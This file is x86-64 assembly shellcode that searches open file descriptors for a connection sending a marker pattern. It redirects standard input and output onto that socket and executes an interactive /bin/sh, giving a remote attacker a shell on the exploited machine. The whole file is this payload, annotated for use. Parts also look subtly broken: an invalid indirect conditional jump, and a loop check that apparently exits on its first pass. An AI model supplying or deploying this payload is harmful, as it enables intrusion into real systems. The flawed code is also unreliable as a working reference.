BITS 64
section .text

	global _start

_start:
	call start
	db "/bin/sh", 0, 0
	db "-i", 0, 0, 0

start:
	xor rdi, rdi		; Start with fd 0

	sub rsp, 8		; get a bit of space on the stack in order to read the pattern later ...
	mov dword [rsp], 0	; ... and set this space to 0

	;;  initialization for recv
	mov rsi, rsp		; get buffer address
	mov rdx, 4		; we'll read 4 bytes
	xor r8, r8		; Last two parameters are sets to NULL ...
	xor r9, r9		; ... and 0

	jmp check_fd_loop_end
check_fd_loop_start:

	inc dil			; check next fd
	mov rcx, 64		; set MSG_DONTWAIT flag recvfrom
	or rcx, 2		; set MSG_PEEK flag
	mov rax, 45		; syscall number for recvfrom
	syscall			; recvfrom(fd, buf, len, flags, NULL, 0));
	
check_fd_loop_end:
	cmp dil, 0		; if we checked all the flags, but did not find anything, we return.
	je [rsp + 16]		; This is where the return adress is store

	cmp dword [rsp], 0x42424242 ; let's check if we got the pattern
	jne check_fd_loop_start

	add rsp, 8		; we do not need the space we alloc'd
	mov rsi, 3		; set the value for fd to dup2 on
dup_loop:
	mov rax, 33		; dup2 syscall
	dec rsi			; next fd
	syscall
	test rsi, rsi		; if fd == 0 stop
	jnz dup_loop

	mov rdi, [rsp]		; Get "/bin/sh" string
	lea rax, [rdi + 9]	; get "-i" option ...
	mov [rsp + 8], rax	; ... and store it on the stack
	lea rsi, [rsp]		; get the array that will be use as argv
	mov qword [rsp + 0x10], 0 ; put a NULL byte at the end
	mov rdx, 0		  ; No env needed, let's put it to NULL
	mov rax, 59		  ; syscall number for exec
	syscall
